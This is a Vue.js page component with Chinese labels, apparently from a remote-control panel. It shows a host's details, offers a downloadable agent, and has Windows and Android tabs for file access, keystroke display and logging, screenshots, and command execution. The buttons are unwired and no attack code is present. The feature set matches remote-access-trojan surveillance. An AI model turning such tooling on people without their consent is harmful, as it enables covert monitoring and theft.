<template>
  <div>
    <a-modal title="下载 Agent"
             :footer="null"
             :visible="isDownloadAgentVisible"
             @cancel="isDownloadAgentVisible = false">
      <DownloadAgent :id="id"/>
    </a-modal>
    <template v-if="!isNotFound">
      <a-page-header class="host-header"
                     :title="isLoading ? '加载中...' : '主机：' + host.name"
                     :sub-title="$route.params.id"
                     @back="() => $router.go(-1)">
        <template slot="extra" v-if="!isLoading">
          <a-button key="1" type="primary" @click="isDownloadAgentVisible = true">
            下载 Agent
          </a-button>
          <a-button key="2" type="danger" :disabled="isDeleting" @click="deleteHost">
            删除
          </a-button>
        </template>
        <a-skeleton active v-if="isLoading" />
        <a-descriptions size="small" :column="2" v-else>
          <a-descriptions-item label="创建时间">
            {{ new Date(host.created_at).toLocaleString() }}
          </a-descriptions-item>
          <a-descriptions-item label="上一次活跃时间">
            <template v-if="host.last_seen === '0001-01-01T00:00:00Z'">从未连接</template>
            <template v-else>{{ new Date(host.last_seen).toLocaleString() }}</template>
          </a-descriptions-item>
          <a-descriptions-item label="地址">
            {{ host.addr }}
          </a-descriptions-item>
          <a-descriptions-item label="操作系统">
            {{ host.os_info }}
          </a-descriptions-item>
          <a-descriptions-item label="状态">
            <a-tag color="green" v-if="host.status"><a-icon type="link" />已连接</a-tag>
            <a-tag color="red" v-else><a-icon type="disconnect" />未连接</a-tag>
          </a-descriptions-item>
        </a-descriptions>
      </a-page-header>
      <a-row type="flex" justify="space-between" style="margin-top: 10px" v-if="!isLoading">
        <a-col :md="15" :xs="24" style="margin-bottom: 10px">
          <a-card
            title="控制"
            :tab-list="tabList"
            :active-tab-key="activeTabKey" @tabChange="key => activeTabKey = key">
            <template v-if="host.status">
              <template v-if="activeTabKey === 'windowsFile'">
                <a-row class="control-field">
                  <a-input-search placeholder="文件/目录路径" size="large">
                    <a-button slot="enterButton" type="primary">
                      操作文件/目录
                    </a-button>
                  </a-input-search>
                </a-row>
                <a-divider/>
                <a-row class="control-field">
                  <a-button type="primary" size="large" style="width: 100%">上传文件</a-button>
                </a-row>
              </template>
              <template v-else-if="activeTabKey === 'windowsKeyboard'">
                <a-row class="control-field">
                  <a-button type="primary" size="large" style="width: 100%">开启实时显示</a-button>
                </a-row>
                <a-divider/>
                <a-row class="control-field">
                  <a-button type="primary" size="large" style="width: 100%">开始日志记录</a-button>
                </a-row>
                <a-row class="control-field">
                  <a-button size="large" style="width: 100%">查看日志记录</a-button>
                </a-row>
              </template>
              <template v-else-if="activeTabKey === 'windowsScreen'">
                <a-row class="control-field">
                  <a-button type="primary" size="large" style="width: 100%">获取当前截屏</a-button>
                </a-row>
                <a-row class="control-field">
                  <a-button size="large" style="width: 100%">查看历史截屏</a-button>
                </a-row>
              </template>
              <template v-else-if="activeTabKey === 'windowsCommand'">
                <a-row class="control-field">
                  <a-input-search placeholder="命令" size="large">
                    <a-button slot="enterButton" type="primary">
                      执行命令
                    </a-button>
                  </a-input-search>
                </a-row>
              </template>
            </template>
            <a-result title="请等待连接后进行操作" v-else/>
          </a-card>
        </a-col>
        <a-col :md="8" :xs="24">
          <a-card title="连接状态" :bodyStyle="{ padding: '0 5px' }">
            <a-table :data-source="connections" :show-header="false" row-key="addr" :loading="isConnectionLoading">
              <a-table-column key="addr" title="地址" data-index="addr"/>
              <a-table-column key="type" title="类型" data-index="type">
                <template slot-scope="type, record">
                  <span v-if="type === 0">控制连接</span>
                  <span v-else>传输连接</span>
                </template>
              </a-table-column>
            </a-table>
          </a-card>
        </a-col>
      </a-row>
    </template>
    <a-result status="404" title="未找到主机" v-else>
      <template #extra>
        <a-button type="primary" @click="$router.go(-1)">
          返回
        </a-button>
      </template>
    </a-result>
  </div>
</template>

<script>
import api from '../api'
import DownloadAgent from './DownloadAgent'
export default {
  name: 'HostDetail',
  components: { DownloadAgent },
  data () {
    return {
      isLoading: true,
      isNotFound: false,
      isDeleting: false,
      isConnectionLoading: true,
      isDownloadAgentVisible: false,
      host: {},
      connections: [],
      windowsControlTabList: [
        {
          key: 'windowsFile',
          tab: '文件'
        },
        {
          key: 'windowsKeyboard',
          tab: '键盘'
        },
        {
          key: 'windowsScreen',
          tab: '屏幕'
        },
        {
          key: 'windowsCommand',
          tab: '命令'
        }
      ],
      androidControlTabList: [
        {
          key: 'androidFile',
          tab: '文件'
        },
        {
          key: 'androidKeyboard',
          tab: '键盘'
        },
        {
          key: 'androidScreen',
          tab: '屏幕'
        },
        {
          key: 'androidCommand',
          tab: '命令'
        }
      ],
      activeTabKey: 'windowsFile'
    }
  },
  methods: {
    load () {
      this.isLoading = true
      this.isNotFound = false
      api.host.getDetail(this.id)
        .then(res => {
          this.activeTabKey = this.host.os_type === 0 ? 'windowsFile' : 'androidFile'
          this.host = res.data.host
          this.loadConnection()
        })
        .catch(err => {
          if (err.response.status === 404) {
            this.isNotFound = true
            this.$message.error(`未找到主机 ${this.id}`)
          } else {
            this.$message.error(`获取主机 ${this.id} 详情失败`)
          }
        })
        .finally(() => {
          this.isLoading = false
        })
    },
    loadConnection () {
      this.isConnectionLoading = true
      api.connection.getList(this.id)
        .then(res => {
          this.connections = res.data.connections
        })
        .catch(() => {
          this.$message.error(`获取连接状态失败`)
        })
        .finally(() => {
          this.isConnectionLoading = false
        })
    },
    deleteHost () {
      this.isDeleting = true
      api.host.delete(this.id)
        .then(() => {
          this.$message.success(`成功删除主机 ${this.id}`)
          this.$router.push({ name: 'hostList' })
        })
        .catch(() => {
          this.$message.error(`删除主机 ${this.id} 失败`)
        })
        .finally(() => {
          this.isDeleting = false
        })
    }
  },
  computed: {
    id () {
      return this.$route.params.id
    },
    tabList () {
      if (!this.host.status) {
        return []
      }
      return this.host.os_type === 0 ? this.windowsControlTabList : this.androidControlTabList
    }
  },
  watch: {
    id () {
      this.load()
    }
  },
  mounted () {
    this.load()
  }
}
</script>

<style scoped>
.host-header {
  border: 1px solid rgb(235, 237, 240);
  background-color: #ffffff;
}
.control-field:not(:first-child) {
  margin-top: 10px;
}
</style>
